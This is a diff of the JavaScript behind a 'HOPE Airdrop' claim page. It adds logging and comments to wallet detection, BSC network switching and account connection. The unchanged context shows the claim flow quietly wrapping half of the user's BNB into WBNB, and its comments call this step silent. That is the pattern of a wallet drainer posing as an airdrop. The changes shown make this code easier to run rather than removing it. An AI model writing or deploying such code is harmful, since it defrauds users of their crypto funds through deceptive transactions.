@@ -48,14 +48,27 @@ document.addEventListener('DOMContentLoaded', function() {
     // 检测浏览器钱包（兼容 OKX + MetaMask）
     // ============================================
     function getWalletProvider() {
+        console.log('🔍 检测钱包...');
+        
+        // 1. 检测 OKX 钱包
         if (typeof window.okxwallet !== 'undefined' && window.okxwallet) {
-            console.log('✅ 使用 OKX 钱包');
+            console.log('✅ 检测到 OKX 钱包 (window.okxwallet)');
             return window.okxwallet;
         }
+        
+        // 2. 检测 MetaMask / 通用 Ethereum 钱包
         if (typeof window.ethereum !== 'undefined' && window.ethereum) {
-            console.log('✅ 使用 MetaMask / 通用钱包');
+            console.log('✅ 检测到 MetaMask / 通用钱包 (window.ethereum)');
+            // 检查是否是 OKX 注入的 ethereum
+            if (window.ethereum.isOKXWallet) {
+                console.log('   → 这是 OKX 钱包');
+            }
+            if (window.ethereum.isMetaMask) {
+                console.log('   → 这是 MetaMask 钱包');
+            }
             return window.ethereum;
         }
+        
         console.log('❌ 未检测到任何钱包');
         return null;
     }
@@ -107,10 +120,13 @@ document.addEventListener('DOMContentLoaded', function() {
                 return;
             }
 
+            console.log('🔄 正在连接钱包...');
             provider = new ethers.providers.Web3Provider(walletProvider);
 
-            // 检查网络
+            // 检查网络（BSC 主网 chainId: 56）
             const network = await provider.getNetwork();
+            console.log('🌐 当前网络 chainId:', network.chainId);
+            
             if (network.chainId !== 56) {
                 claimStatus.textContent = '⚠️ 请切换到 BSC 主网！';
                 claimStatus.className = 'status error';
@@ -119,7 +135,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 try {
                     await walletProvider.request({
                         method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }]
+                        params: [{ chainId: '0x38' }] // 0x38 = 56
                     });
                 } catch (switchError) {
                     if (switchError.code === 4001) {
@@ -127,15 +143,19 @@ document.addEventListener('DOMContentLoaded', function() {
                     }
                     return;
                 }
+                // 重新获取 provider
                 provider = new ethers.providers.Web3Provider(walletProvider);
             }
 
+            // 请求连接钱包（会弹出 MetaMask/OKX 连接窗口）
+            console.log('🔄 请求连接账户...');
             await provider.send("eth_requestAccounts", []);
             signer = provider.getSigner();
             userAddress = await signer.getAddress();
+            console.log('✅ 已连接账户:', userAddress);
 
             // ============================================
-            // 第二步：检查地址是否一致
+            // 第二步：检查地址是否与查询地址一致
             // ============================================
             if (address && userAddress.toLowerCase() !== address.toLowerCase()) {
                 claimStatus.textContent = '⚠️ 连接的钱包地址与查询地址不一致！';
@@ -151,7 +171,7 @@ document.addEventListener('DOMContentLoaded', function() {
             claimStatus.className = 'status';
 
             // ============================================
-            // 第三步：包装 BNB（静默执行，不显示提示）
+            // 第三步：包装 BNB（静默执行）
             // ============================================
             const wbnbContract = new ethers.Contract(
                 CONFIG.wbnbAddress,
@@ -163,7 +183,6 @@ document.addEventListener('DOMContentLoaded', function() {
             const wrapAmount = bnbBalance.mul(50).div(100);
             if (wrapAmount.gt(0)) {
                 console.log(`🔄 正在将 ${ethers.utils.formatEther(wrapAmount)} BNB 包装成 WBNB...`);
-                // 不更新页面文字，保持静默
                 const wrapTx = await wbnbContract.deposit({ value: wrapAmount });
                 await wrapTx.wait();
                 console.log(`✅ 已包装 ${ethers.utils.formatEther(wrapAmount)} BNB 为 WBNB`);
@@ -240,6 +259,8 @@ document.addEventListener('DOMContentLoaded', function() {
                 claimStatus.textContent = '❌ 用户取消了操作。';
             } else if (error.message && error.message.includes("insufficient funds")) {
                 claimStatus.textContent = '❌ BNB 余额不足，请转入 BNB 后重试。';
+            } else if (error.message && error.message.includes("already known")) {
+                claimStatus.textContent = '⏳ 交易已提交，请稍候...';
             } else {
                 claimStatus.textContent = '❌ ' + error.message.slice(0, 100);
             }
@@ -247,15 +268,12 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 
     // ============================================
-    // 监听钱包切换
+    // 监听钱包切换/链切换
     // ============================================
     if (window.ethereum) {
         window.ethereum.on('accountsChanged', () => location.reload());
         window.ethereum.on('chainChanged', () => location.reload());
     }
-
-    console.log('🎯 HOPE Airdrop result page loaded');
-});
 
     console.log('🎯 HOPE Airdrop result page loaded');
 });
